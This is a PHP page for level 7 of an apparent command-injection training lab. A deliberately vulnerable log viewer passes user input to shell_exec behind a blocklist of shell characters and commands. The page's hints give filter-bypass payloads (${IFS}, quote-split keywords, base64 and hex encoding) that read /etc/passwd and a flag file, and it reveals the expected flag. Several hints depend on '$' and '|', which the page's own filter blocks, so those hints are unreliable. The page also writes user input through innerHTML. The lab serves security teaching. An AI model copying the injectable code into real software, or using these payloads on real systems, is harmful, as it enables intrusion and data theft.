<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 7 - Output Redirection & Encoding</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔄 Level 7 - Output Redirection & Encoding</h1>
            <p><strong>Objective:</strong> Sử dụng encoding và output redirection để bypass advanced filters</p>
        </div>

        <div class="form-container">
            <h3>🔍 Log Analyzer:</h3>
            <p>Công cụ này phân tích log files. Chỉ chấp nhận alphanumeric characters và một số ký tự đặc biệt.</p>
            
            <div class="code-block">Command: tail -n 10 /var/log/<?php echo htmlspecialchars($_GET['logfile'] ?? '[FILENAME]'); ?>.log | grep "ERROR"</div>
            
            <?php
            if (isset($_GET['logfile'])) {
                // Initialize level-specific flag access
                require_once 'flag_system.php';
                get_level_flag(7);
                
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $logfile = $_GET['logfile'];
                
                // Advanced filter - blocks many special characters
                $blocked_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', ' ', 'cat', 'ls', 'whoami', 'id'];
                $is_blocked = false;
                
                foreach ($blocked_chars as $char) {
                    if (strpos($logfile, $char) !== false) {
                        $is_blocked = true;
                        echo '<div class="error">🚫 Blocked character detected: ' . htmlspecialchars($char) . '</div>';
                        break;
                    }
                }
                
                if (!$is_blocked) {
                    $command = "tail -n 10 /var/log/" . $logfile . ".log | grep 'ERROR'";
                    $output = shell_exec($command . " 2>&1");
                    
                    if ($output) {
                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
                    } else {
                        echo '<div class="success">✅ No errors found in log file</div>';
                    }
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="logfile">Log File Name:</label>
                    <input type="text" id="logfile" name="logfile" value="<?php echo htmlspecialchars($_GET['logfile'] ?? ''); ?>" placeholder="Enter log filename (e.g., apache)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Analyze Log</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🚫 Advanced Filter Rules</h3>
                <ul>
                    <li><strong>Blocked characters:</strong> ; & | ` $ ( ) < > [space]</li>
                    <li><strong>Blocked keywords:</strong> cat, ls, whoami, id</li>
                    <li><strong>Challenge:</strong> Execute commands without these characters/words</li>
                    <li><strong>Techniques needed:</strong> Encoding, variable substitution, tab characters</li>
                </ul>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🔤 Advanced Bypass Techniques</h3>
                <ul>
                    <li><strong>Tab instead of space:</strong> Use \t character</li>
                    <li><strong>Environment variables:</strong> ${HOME}, ${PATH}</li>
                    <li><strong>Character concatenation:</strong> ca''t, wh''oami</li>
                    <li><strong>Hex encoding:</strong> echo -e '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'</li>
                    <li><strong>Base64 encoding:</strong> echo 'bHM=' | base64 -d</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Advanced Filters</h4>
                    <p><strong>Current Command:</strong> <code>tail -n 10 /var/log/[FILENAME].log | grep "ERROR"</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>apache</code> (should work normally)</p>
                    <p>📝 <strong>Test blocked:</strong> <code>apache; whoami</code> (should be blocked)</p>
                    <p>🎯 <strong>Challenge:</strong> Need to execute commands without using blocked characters</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Tab Character Bypass</h4>
                    <p><strong>Concept:</strong> Use tab character instead of space</p>
                    <p>📝 <strong>Method:</strong> Copy and paste this: <code>apache	../../../etc/passwd</code></p>
                    <p>🎯 <strong>Note:</strong> The whitespace above is a TAB character (ASCII 9), not space (ASCII 32)</p>
                    <p><strong>Alternative:</strong> Use %09 (URL encoded tab) if input accepts URL encoding</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Environment Variable Substitution</h4>
                    <p><strong>Concept:</strong> Use environment variables to avoid blocked characters</p>
                    <p>📝 <strong>Example:</strong> <code>apache${IFS}../../../etc/passwd</code></p>
                    <p>🎯 <strong>Explanation:</strong> ${IFS} expands to Internal Field Separator (space/tab)</p>
                    <p><strong>More variables:</strong></p>
                    <p>• ${HOME} - User home directory</p>
                    <p>• ${PATH} - System PATH variable</p>
                    <p>• ${PWD} - Current working directory</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: String Concatenation</h4>
                    <p><strong>Concept:</strong> Break up blocked keywords using quotes</p>
                    <p>📝 <strong>Method:</strong> <code>apache${IFS}../../../../bin/c''at${IFS}/etc/passwd</code></p>
                    <p>🎯 <strong>Explanation:</strong> c''at = cat (empty string concatenation)</p>
                    <p><strong>Variations:</strong></p>
                    <p>• <code>c"a"t</code> = cat</p>
                    <p>• <code>w'h'oami</code> = whoami</p>
                    <p>• <code>i""d</code> = id</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Base64 Encoding Bypass</h4>
                    <p><strong>Concept:</strong> Encode commands in base64 to avoid keyword detection</p>
                    <p>📝 <strong>Preparation:</strong> First encode your command:</p>
                    <p><code>echo 'cat /etc/passwd' | base64</code> → <code>Y2F0IC9ldGMvcGFzc3dkCg==</code></p>
                    <p>📝 <strong>Execution:</strong> <code>apache${IFS}..${IFS}echo${IFS}Y2F0IC9ldGMvcGFzc3dkCg==|base64${IFS}-d</code></p>
                    <p>🎯 <strong>Note:</strong> This bypasses keyword filtering by encoding the command</p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>💡 Hint 6: Hex Encoding Method</h4>
                    <p><strong>Concept:</strong> Use hexadecimal encoding to represent commands</p>
                    <p>📝 <strong>Method:</strong> <code>apache${IFS}..${IFS}echo${IFS}-e${IFS}'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'</code></p>
                    <p>🎯 <strong>Explanation:</strong> \x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64 = "cat /etc/passwd"</p>
                    <p><strong>Hex conversion:</strong></p>
                    <p>• c = \x63, a = \x61, t = \x74</p>
                    <p>• [space] = \x20, / = \x2f</p>
                </div>
                <div id="hint-7" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 7: Find the Flag!</h4>
                    <p><strong>🚀 Target:</strong> <code>/tmp/level7_flag.txt</code></p>
                    <p><strong>Method 1 (IFS + quotes):</strong> <code>apache${IFS}../../../../tmp/level7''_flag.txt</code></p>
                    <p><strong>Method 2 (Base64):</strong> Encode "cat /tmp/level7_flag.txt" and use previous hint</p>
                    <p><strong>Method 3 (Hex):</strong> Convert the path to hex and use echo -e</p>
                    <p><strong>🎯 Expected Flag:</strong> <code>FLAG{advanced_encoding_bypass_successful}</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level6.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level8.php">➡️ Next Level</a>
            <a href="submit.php?level=7">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 7;

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint === maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }

    function updateCommand() {
        const logfile = document.getElementById('logfile').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = `Command: tail -n 10 /var/log/<span style="color: #ed8936; font-weight: bold;">${logfile || '[FILENAME]'}</span>.log | grep "ERROR"`;
    }
    </script>
</body>
</html>
